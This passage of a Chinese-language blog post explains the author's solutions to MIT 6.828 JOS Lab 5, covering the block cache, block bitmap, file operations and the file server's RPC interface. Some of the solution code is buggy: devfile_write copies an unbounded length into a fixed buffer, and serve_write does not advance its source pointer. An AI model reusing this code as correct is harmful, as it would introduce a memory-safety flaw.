file server (type == ENV_TYPE_FS) give it I/O privileges.</span></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">if</span>(env_alloc(&amp;e,<span class="number">0</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;env_alloc(): env_alloc failed!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(type == ENV_TYPE_FS)&#123;</span><br><span class="line">e-&gt;env_tf.tf_eflags |= FL_IOPL_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">load_icode(e,binary);</span><br><span class="line">e-&gt;env_type = type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Question</p><ol><li><p>你是否不得不做一些其他事来确保当环境不断切换时，I/O特权设定依然能被保存和恢复？ 为什么？</p><p>不需要，因为我们切换环境的时候，会保存我们的EFLAGS寄存器，然后切换回来的时候，又会恢复。</p></li></ol></blockquote><h2 id="The-Block-Cache"><a href="#The-Block-Cache" class="headerlink" title="The Block Cache"></a>The Block Cache</h2><p>我们的文件系统最大支持3GB，文件系统进程保留0x10000000(DISKMAP)到0xD0000000(DISKMAP+DISKMAX)固定3GB的内存空间作为磁盘的缓存。比如block 0被映射到虚拟地址0x10000000，block 1被映射到虚拟地址0x10001000，以此类推。</p><p>刚开始还纳闷怎么给这么多的空间，后来想到我们的环境间虚拟空间都是独立的，并且我们的文件系统环境唯一需要做的事情就是实现文件是access，那么给这么大的空间也是合情合理。</p><p>如果将整个磁盘全部读到内存将非常耗时，所以我们将实现按需加载，只有当访问某个block对应的内存地址时出现页错误，才将block从磁盘加载到对应的内存区域，然后重新执行内存访问指令。</p><p><strong>exercise2</strong></p><p>bc_pgfault是FS进程缺页处理函数，负责将数据从磁盘读取到对应内存。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">bc_pgfault(struct UTrapframe *utf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *addr = (<span class="keyword">void</span> *) utf-&gt;utf_fault_va;</span><br><span class="line"><span class="keyword">uint32_t</span> blockno = ((<span class="keyword">uint32_t</span>)addr - DISKMAP) / BLKSIZE;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the fault was within the block cache region</span></span><br><span class="line"><span class="keyword">if</span> (addr &lt; (<span class="keyword">void</span>*)DISKMAP || addr &gt;= (<span class="keyword">void</span>*)(DISKMAP + DISKSIZE))</span><br><span class="line">panic(<span class="string">&quot;page fault in FS: eip %08x, va %08x, err %04x&quot;</span>,</span><br><span class="line">      utf-&gt;utf_eip, addr, utf-&gt;utf_err);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanity check the block number.</span></span><br><span class="line"><span class="keyword">if</span> (super &amp;&amp; blockno &gt;= super-&gt;s_nblocks)</span><br><span class="line">panic(<span class="string">&quot;reading non-existent block %08x\n&quot;</span>, blockno);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page in the disk map region, read the contents</span></span><br><span class="line"><span class="comment">// of the block from the disk into that page.</span></span><br><span class="line"><span class="comment">// Hint: first round addr to page boundary. fs/ide.c has code to read</span></span><br><span class="line"><span class="comment">// the disk.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 5: you code here:</span></span><br><span class="line">addr = ROUNDDOWN(addr,PGSIZE);</span><br><span class="line">sys_page_alloc(<span class="number">0</span>, addr, PTE_W|PTE_U|PTE_P);</span><br><span class="line"><span class="keyword">uint32_t</span> secnum = blockno * BLKSECTS;</span><br><span class="line"><span class="keyword">if</span>((r = ide_read(secnum,addr,BLKSECTS)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;ide_read(): %e\n&quot;</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Clear the dirty bit for the disk block page since we just read the</span></span><br><span class="line"><span class="comment">// block from disk</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, addr, uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;in bc_pgfault, sys_page_map: %e&quot;</span>, r);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the block we read was allocated. (exercise for</span></span><br><span class="line"><span class="comment">// the reader: why do we do this *after* reading the block</span></span><br><span class="line"><span class="comment">// in?)</span></span><br><span class="line"><span class="keyword">if</span> (bitmap &amp;&amp; block_is_free(blockno))</span><br><span class="line">panic(<span class="string">&quot;reading free block %08x\n&quot;</span>, blockno);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flush_block()将一个block写入磁盘。flush_block()不需要做任何操作，如果block没有在内存或者block没有被写过。可以通过PTE的PTE_D位判断该block有没有被写过。注释基本写得很详细了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">flush_block(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> blockno = ((<span class="keyword">uint32_t</span>)addr - DISKMAP) / BLKSIZE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (addr &lt; (<span class="keyword">void</span>*)DISKMAP || addr &gt;= (<span class="keyword">void</span>*)(DISKMAP + DISKSIZE))</span><br><span class="line">panic(<span class="string">&quot;flush_block of bad va %08x&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;flush_block not implemented&quot;);</span></span><br><span class="line">addr = ROUNDDOWN(addr,PGSIZE);</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">uint32_t</span> secnum = blockno * BLKSECTS;</span><br><span class="line"><span class="keyword">if</span>(va_is_mapped(addr) &amp;&amp; va_is_dirty(addr))&#123;<span class="comment">//如果addr还没有映射过或者该页载入到内存后还没有被写过，does nothing</span></span><br><span class="line">ide_write(secnum,addr,BLKSECTS);<span class="comment">//写回到磁盘</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, addr, uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)) &lt; <span class="number">0</span>)<span class="comment">//清空PTE_D位</span></span><br><span class="line">panic(<span class="string">&quot;in bc_pgfault, sys_page_map: %e&quot;</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fs/fs.c中的fs_init()将会初始化super和bitmap全局指针变量。至此对于文件系统进程只要访问虚拟内存[DISKMAP, DISKMAP+DISKMAX]范围中的地址addr，就会访问到磁盘((uint32_t)addr - DISKMAP) / BLKSIZE block中的数据。如果block数据还没复制到内存物理页，bc_pgfault()缺页处理函数会将数据从磁盘拷贝到某个物理页，并且将addr映射到该物理页。这样FS进程只需要访问虚拟地址空间[DISKMAP, DISKMAP+DISKMAX]就能访问磁盘了。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13927193876/0" alt="image-20210828013331417"></p><h2 id="The-Block-Bitmap"><a href="#The-Block-Bitmap" class="headerlink" title="The Block Bitmap"></a>The Block Bitmap</h2><p>fs_init已经初始化了bitmap，我们能通过bitmap访问磁盘的block 1，也就是位数组，每一位代表一个block，1表示该block未被使用，0表示已被使用。我们实现一系列管理函数来管理这个数组。</p><p><strong>exercise3</strong></p><p>实现fs/fs.c中的alloc_block()，该函数搜索bitmap位数组，返回一个未使用的block，并将其标记为已使用。这里可以参考上面的free_block，而且我们要注意1代表未使用，0代表已使用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">alloc_block(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The bitmap consists of one or more blocks.  A single bitmap block</span></span><br><span class="line"><span class="comment">// contains the in-use bits for BLKBITSIZE blocks.  There are</span></span><br><span class="line"><span class="comment">// super-&gt;s_nblocks blocks in the disk altogether.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;alloc_block not implemented&quot;);</span></span><br><span class="line"><span class="keyword">uint32_t</span> bmpblock_start = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">uint32_t</span> blockno = <span class="number">1</span>;blockno &lt; super-&gt;s_nblocks;blockno++)&#123;</span><br><span class="line"><span class="keyword">if</span>(block_is_free(blockno))&#123;</span><br><span class="line">bitmap[blockno/<span class="number">32</span>] &amp;= ~(<span class="number">1</span>&lt;&lt;(blockno%<span class="number">32</span>));</span><br><span class="line">flush_block(&amp;bitmap[blockno/<span class="number">32</span>]);</span><br><span class="line"><span class="keyword">return</span> blockno;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -E_NO_DISK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="File-Operations"><a href="#File-Operations" class="headerlink" title="File Operations"></a>File Operations</h2><p>fs/fs.c文件提供了一系列函数用于管理File结构，扫描和管理目录文件，解析绝对路径。<br>基本的文件系统操作：</p><ol><li><code>file_block_walk(struct File *f, uint32_t filebno, uint32_t **ppdiskbno, bool alloc)</code>：查找f指向文件结构的第filebno个block的存储地址，保存到ppdiskbno中。如果f-&gt;f_indirect还没有分配，且alloc为真，那么将分配要给新的block作为该文件的f-&gt;f_indirect。类比页表管理pgdir_walk()。</li><li><code>file_get_block(struct File *f, uint32_t filebno, char **blk)</code>：该函数查找文件第filebno个block对应的虚拟地址addr，并将其保存到blk地址处。</li><li><code>walk_path(const char *path, struct File **pdir, struct File **pf, char *lastelem)</code>：解析路径path，填充pdir和pf地址处的File结构。比如/aa/bb/cc.c那么pdir代表指向bb目录的File结构，pf指向代表cc.c文件的File结构。又比如/aa/bb/cc.c，但是此时cc.c还不存在，那么pdir依旧指向代表bb目录的File结构，但是pf地址处应该为0，lastelem指向的字符串应该是cc.c。</li><li><code>dir_lookup(struct File *dir, const char *name, struct File **file)</code>：该函数查找dir指向的文件内容，寻找File.name为name的File结构，并保存到file地址处。</li><li><code>dir_alloc_file(struct File *dir, struct File **file)</code>：在dir目录文件的内容中寻找一个未被使用的File结构，将其地址保存到file的地址处。</li></ol><p>文件操作：</p><ol><li><code>file_create(const char *path, struct File **pf)</code>：创建path，如果创建成功pf指向新创建的File指针</li><li><code>file_open(const char *path, struct File **pf)</code>：寻找path对应的File结构地址，保存到pf地址处。</li><li><code>file_read(struct File *f, void *buf, size_t count, off_t offset)</code>：从文件f中的offset字节处读取count字节到buf处</li><li><code>file_write(struct File *f, const void *buf, size_t count, off_t offset)</code>：将buf处的count字节写到文件f的offset开始的位置。</li></ol><p><strong>exercise4</strong></p><p>file_block_walk():</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">file_block_walk(struct File *f, <span class="keyword">uint32_t</span> filebno, <span class="keyword">uint32_t</span> **ppdiskbno, <span class="keyword">bool</span> alloc)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="comment">// LAB 5: Your code here.</span></span><br><span class="line">       <span class="comment">//panic(&quot;file_block_walk not implemented&quot;);</span></span><br><span class="line">   <span class="keyword">int</span> bn;</span><br><span class="line">   <span class="keyword">uint32_t</span> *indirects;</span><br><span class="line">   <span class="comment">//out of range</span></span><br><span class="line">   <span class="keyword">if</span>(filebno &gt;= NDIRECT + NINDIRECT)&#123;</span><br><span class="line">   <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//filebno在前10个block中</span></span><br><span class="line">   <span class="keyword">if</span>(filebno &lt; NDIRECT)&#123;</span><br><span class="line">   *ppdiskbno = &amp;(f-&gt;f_direct[filebno]);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(f-&gt;f_indirect)&#123;</span><br><span class="line">   indirects = diskaddr(f-&gt;f_indirect);</span><br><span class="line">   *ppdiskbno = &amp;(indirects[filebno - NDIRECT]);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(!alloc) <span class="keyword">return</span> -E_NOT_FOUND;</span><br><span class="line">   <span class="keyword">if</span>((bn = alloc_block()) &lt; <span class="number">0</span>) <span class="keyword">return</span> bn;</span><br><span class="line">   f-&gt;f_indirect = bn;</span><br><span class="line">   flush_block(diskaddr(bn));</span><br><span class="line">   indirects = diskaddr(bn);</span><br><span class="line">   *ppdiskbno = &amp;(indirects[filebno - NDIRECT]);</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="The-file-system-interface"><a href="#The-file-system-interface" class="headerlink" title="The file system interface"></a>The file system interface</h2><p>到目前为止，文件系统进程已经能提供各种操作文件的功能了，但是其他用户进程不能直接调用这些函数。我们通过进程间函数调用(RPC)对其它进程提供文件系统服务。RPC机制原理如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">      Regular env           FS env</span><br><span class="line">   +---------------+   +---------------+</span><br><span class="line">   |      read     |   |   file_read   |</span><br><span class="line">   |   (lib&#x2F;fd.c)  |   |   (fs&#x2F;fs.c)   |</span><br><span class="line">...|.......|.......|...|.......^.......|...............</span><br><span class="line">   |       v       |   |       |       | RPC mechanism</span><br><span class="line">   |  devfile_read |   |  serve_read   |</span><br><span class="line">   |  (lib&#x2F;file.c) |   |  (fs&#x2F;serv.c)  |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   |       v       |   |       |       |</span><br><span class="line">   |     fsipc     |   |     serve     |</span><br><span class="line">   |  (lib&#x2F;file.c) |   |  (fs&#x2F;serv.c)  |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   |       v       |   |       |       |</span><br><span class="line">   |   ipc_send    |   |   ipc_recv    |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   +-------|-------+   +-------|-------+</span><br><span class="line">           |                   |</span><br><span class="line">           +-------------------+</span><br></pre></td></tr></table></figure><p>本质上RPC还是借助IPC机制实现的，普通进程通过IPC向FS进程间发送具体操作和操作数据，然后FS进程执行文件操作，最后又将结果通过IPC返回给普通进程。从上图中可以看到客户端的代码在lib/fd.c和lib/file.c两个文件中。服务端的代码在fs/fs.c和fs/serv.c两个文件中。</p><p>相关数据结构关系：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab5/lab5_4_%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="文件系统相关数据结构关系"></p><p>文件系统服务端代码在fs/serv.c中，serve()中有一个无限循环，接收IPC请求，将对应的请求分配到对应的处理函数，然后将结果通过IPC发送回去。<br>对于客户端来说：发送一个32位的值作为请求类型，发送一个Fsipc结构作为请求参数，该数据结构通过IPC的页共享发给FS进程，在FS进程可以通过访问fsreq(0x0ffff000)来访问客户进程发来的Fsipc结构。<br>对于服务端来说：FS进程返回一个32位的值作为返回码，对于FSREQ_READ和FSREQ_STAT这两种请求类型，还额外通过IPC返回一些数据。</p><p><strong>exercise5</strong></p><p>实现fs/serv.c中的serve_read()。这是服务端也就是FS进程中的函数。直接调用更底层的fs/fs.c中的函数来实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">serve_read(<span class="keyword">envid_t</span> envid, <span class="keyword">union</span> Fsipc *ipc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fsreq_read</span> *<span class="title">req</span> =</span> &amp;ipc-&gt;read;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fsret_read</span> *<span class="title">ret</span> =</span> &amp;ipc-&gt;readRet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (debug)</span><br><span class="line">cprintf(<span class="string">&quot;serve_read %08x %08x %08x\n&quot;</span>, envid, req-&gt;req_fileid, req-&gt;req_n);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Lab 5: Your code here:</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">o</span>;</span></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">r = openfile_lookup(envid,req-&gt;req_fileid,&amp;o); <span class="comment">//通过fileid找到Openfile结构</span></span><br><span class="line"><span class="keyword">if</span>(r &lt; <span class="number">0</span>) <span class="keyword">return</span> r;</span><br><span class="line"><span class="keyword">if</span>((r = file_read(o-&gt;o_file,ret-&gt;ret_buf,req-&gt;req_n,o-&gt;o_fd-&gt;fd_offset)) &lt; <span class="number">0</span>) <span class="keyword">return</span> r; <span class="comment">//调用fs.c中函数进行真正的读操作</span></span><br><span class="line">o-&gt;o_fd-&gt;fd_offset += r;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exercise6</strong></p><p>实现fs/serv.c中的serve_write()和lib/file.c中的devfile_write()。<br>serve_write():</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">serve_write(<span class="keyword">envid_t</span> envid, struct Fsreq_write *req)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (debug)</span><br><span class="line">cprintf(<span class="string">&quot;serve_write %08x %08x %08x\n&quot;</span>, envid, req-&gt;req_fileid, req-&gt;req_n);</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;serve_write not implemented&quot;);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">o</span>;</span></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">if</span>((r = openfile_lookup(envid,req-&gt;req_fileid,&amp;o)) &lt; <span class="number">0</span>) <span class="keyword">return</span> r;</span><br><span class="line"><span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">r = file_write(o-&gt;o_file,req-&gt;req_buf,req-&gt;req_n,o-&gt;o_fd-&gt;fd_offset);</span><br><span class="line"><span class="keyword">if</span>(r &lt; <span class="number">0</span>) <span class="keyword">return</span> r;</span><br><span class="line">total += r;</span><br><span class="line">o-&gt;o_fd-&gt;fd_offset += r;</span><br><span class="line"><span class="keyword">if</span>(req-&gt;req_n &lt;= total) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>devfile_write():客户端进程函数，包装一下参数，直接调用fsipc()将参数发送给FS进程处理。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">devfile_write(struct Fd *fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Make an FSREQ_WRITE request to the file system server.  Be</span></span><br><span class="line"><span class="comment">// careful: fsipcbuf.write.req_buf is only so large, but</span></span><br><span class="line"><span class="comment">// remember that write is always allowed to write *fewer*</span></span><br><span class="line"><span class="comment">// bytes than requested.</span></span><br><span class="line"><span class="comment">// LAB 5: Your code here</span></span><br><span class="line"><span class="comment">//panic(&quot;devfile_write not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">fsipcbuf.write.req_fileid = fd-&gt;fd_file.id;</span><br><span class="line">fsipcbuf.write.req_n = n;</span><br><span class="line">memmove(fsipcbuf.write.req_buf,buf,n);</span><br><span class="line"><span class="keyword">return</span> fsipc(FSREQ_WRITE,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="库函数open-实现"><a href="#库函数open-实现" class="headerlink" title="库函数open()实现"></a>库函数open()实现</h2><p>以打开一个文件为例，看下整体过程，read(), write()类似。open()在linux中也要实现定义在头文件&lt;fcntl.h&gt;中，原型如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>在JOS中open()实现在lib/file.c中，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">open(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Find an unused file descriptor page using fd_alloc.</span></span><br><span class="line">    <span class="comment">// Then send a file-open request to the file server.</span></span><br><span class="line">    <span class="comment">// Include &#x27;path&#x27; and &#x27;omode&#x27; in request,</span></span><br><span class="line">    <span class="comment">// and map the returned file descriptor page</span></span><br><span class="line">    <span class="comment">// at the appropriate fd address.</span></span><br><span class="line">    <span class="comment">// FSREQ_OPEN returns 0 on success, &lt; 0 on failure.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// (fd_alloc does not allocate a page, it just returns an</span></span><br><span class="line">    <span class="comment">// unused fd address. Do you need to allocate a page?)</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Return the file descriptor index.</span></span><br><span class="line">    <span class="comment">// If any step after fd_alloc fails, use fd_close to free the</span></span><br><span class="line">    <span class="comment">// file descriptor.</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Fd</span> *<span class="title">fd</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(path) &gt;= MAXPATHLEN)         <span class="comment">//文件名不能超过指定长度</span></span><br><span class="line">        <span class="keyword">return</span> -E_BAD_PATH;</span><br><span class="line">    <span class="keyword">if</span> ((r = fd_alloc(&amp;fd)) &lt; <span class="number">0</span>)            <span class="comment">//搜索当前进程未被分配的文件描述符</span></span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    <span class="built_in">strcpy</span>(fsipcbuf.open.req_path, path);</span><br><span class="line">    fsipcbuf.open.req_omode = mode;</span><br><span class="line">    <span class="keyword">if</span> ((r = fsipc(FSREQ_OPEN, fd)) &lt; <span class="number">0</span>) &#123;  <span class="comment">//通过fsipc()向FS进程发起RPC调用</span></span><br><span class="line">        fd_close(fd, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd2num(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">fsipc(<span class="keyword">unsigned</span> type, <span class="keyword">void</span> *dstva)       <span class="comment">//type, fsipcbuf是发送给fs进程的数据。dstava和fsipc()的返回值是从fs进程接收的值</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">envid_t</span> fsenv;</span><br><span class="line">    <span class="keyword">if</span> (fsenv == <span class="number">0</span>)</span><br><span class="line">        fsenv = ipc_find_env(ENV_TYPE_FS);</span><br><span class="line">    <span class="keyword">static_assert</span>(<span class="keyword">sizeof</span>(fsipcbuf) == PGSIZE);</span><br><span class="line"></span><br><span class="line">    ipc_send(fsenv, type, &amp;fsipcbuf, PTE_P | PTE_W | PTE_U);  <span class="comment">//向FS进程发送数据</span></span><br><span class="line">    <span class="keyword">return</span> ipc_recv(<span class="literal">NULL</span>, dstva, <span class="literal">NULL</span>);         <span class="comment">//接收FS进程发送回来的数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中fd_alloc()定义在lib/fd.c中，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">fd_alloc(struct Fd **fd_store)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Fd</span> *<span class="title">fd</span>;</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXFD; i++) &#123;   <span class="comment">//从当前最小的未分配描述符开始</span></span><br><span class="line">        fd = INDEX2FD(i);</span><br><span class="line">        <span class="keyword">if</span> ((uvpd[PDX(fd)] &amp; PTE_P) == <span class="number">0</span> || (uvpt[PGNUM(fd)] &amp; PTE_P) == <span class="number">0</span>) &#123;</span><br><span class="line">            *fd_store = fd;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *fd_store = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> -E_MAX_OPEN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab5/lab5_7_open()%E5%8E%9F%E7%90%86.png" alt="lab5_7_open原理.png"></p><p>每个进程从虚拟地址0xD0000000开始，每一页对应一个FD结构，也就是说文件描述符0对应的FD结构地址为0xD0000000，文件描述符1对应的FD结构地址为0xD0000000+PGSIZE，以此类推。可以通过检查某个FD结构的虚拟地址是否分配，来判断文件描述符是否被分配。如果一个文件描述符被分配了，那么该文件描述符对应的FD结构开始的一页将被映射到和FS进程相同的物理地址处。</p><p>FS进程收到FSREQ_OPEN请求后，将调用serve_open()，该函数定义在fs/serv.c中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">serve_open(<span class="keyword">envid_t</span> envid, struct Fsreq_open *req,</span><br><span class="line">     <span class="keyword">void</span> **pg_store, <span class="keyword">int</span> *perm_store)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> path[MAXPATHLEN];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">File</span> *<span class="title">f</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fileid;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">o</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (debug)</span><br><span class="line">        cprintf(<span class="string">&quot;serve_open %08x %s 0x%x\n&quot;</span>, envid, req-&gt;req_path, req-&gt;req_omode);</span><br><span class="line">    <span class="comment">// Copy in the path, making sure it&#x27;s null-terminated</span></span><br><span class="line">    memmove(path, req-&gt;req_path, MAXPATHLEN);</span><br><span class="line">    path[MAXPATHLEN<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Find an open file ID</span></span><br><span class="line">    <span class="keyword">if</span> ((r = openfile_alloc(&amp;o)) &lt; <span class="number">0</span>) &#123;                 <span class="comment">//从opentab数组中分配一个OpenFile结构</span></span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            cprintf(<span class="string">&quot;openfile_alloc failed: %e&quot;</span>, r);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    fileid = r;</span><br><span class="line">    <span class="comment">// Open the file</span></span><br><span class="line">    <span class="keyword">if</span> (req-&gt;req_omode &amp; O_CREAT) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((r = file_create(path, &amp;f)) &lt; <span class="number">0</span>) &#123;          <span class="comment">//根据path分配一个File结构</span></span><br><span class="line">            <span class="keyword">if</span> (!(req-&gt;req_omode &amp; O_EXCL) &amp;&amp; r == -E_FILE_EXISTS)</span><br><span class="line">                <span class="keyword">goto</span> try_open;</span><br><span class="line">            <span class="keyword">if</span> (debug)</span><br><span class="line">                cprintf(<span class="string">&quot;file_create failed: %e&quot;</span>, r);</span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">try_open:</span><br><span class="line">        <span class="keyword">if</span> ((r = file_open(path, &amp;f)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (debug)</span><br><span class="line">                cprintf(<span class="string">&quot;file_open failed: %e&quot;</span>, r);</span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Truncate</span></span><br><span class="line">    <span class="keyword">if</span> (req-&gt;req_omode &amp; O_TRUNC) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((r = file_set_size(f, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (debug)</span><br><span class="line">                cprintf(<span class="string">&quot;file_set_size failed: %e&quot;</span>, r);</span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((r = file_open(path, &amp;f)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            cprintf(<span class="string">&quot;file_open failed: 